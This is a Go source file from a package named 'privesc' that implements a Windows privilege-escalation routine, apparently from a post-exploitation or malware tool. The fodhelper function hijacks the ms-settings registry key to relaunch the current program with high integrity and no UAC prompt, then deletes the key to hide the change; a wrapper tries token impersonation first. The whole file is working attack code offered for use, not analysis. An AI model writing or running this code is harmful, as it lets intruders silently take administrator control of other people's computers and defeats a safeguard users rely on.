//go:build windows
// +build windows

package privesc

import (
	"os"
	"os/exec"

	"golang.org/x/sys/windows/registry"
)

// tryFodhelperUACBypass elevates via the fodhelper.exe auto-elevation COM trick.
// Writes HKCU\Software\Classes\ms-settings\shell\open\command to point to the
// current executable, then launches fodhelper.exe which triggers the registry
// path as a high-integrity process — no UAC prompt.
func tryFodhelperUACBypass() bool {
	if isElevated() {
		return true
	}

	exePath, err := os.Executable()
	if err != nil {
		return false
	}

	const keyPath = `Software\Classes\ms-settings\shell\open\command`

	k, _, err := registry.CreateKey(registry.CURRENT_USER, keyPath, registry.SET_VALUE)
	if err != nil {
		return false
	}
	if err := k.SetStringValue("", exePath); err != nil {
		k.Close()
		return false
	}
	if err := k.SetStringValue("DelegateExecute", ""); err != nil {
		k.Close()
		return false
	}
	k.Close()

	// Launch fodhelper.exe — it reads HKCU\ms-settings and executes our binary elevated.
	cmd := exec.Command(`C:\Windows\System32\fodhelper.exe`)
	sp := syscallSysProcAttr()
	cmd.SysProcAttr = &sp
	_ = cmd.Start()

	// Clean up the registry key regardless of outcome.
	_ = registry.DeleteKey(registry.CURRENT_USER, keyPath)

	return isElevated()
}

// tryElevate attempts privilege escalation via token impersonation first,
// then UAC bypass if still not elevated.
func tryElevate() bool {
	if isElevated() {
		return true
	}
	if tryTokenImpersonation() && isElevated() {
		return true
	}
	return tryFodhelperUACBypass()
}
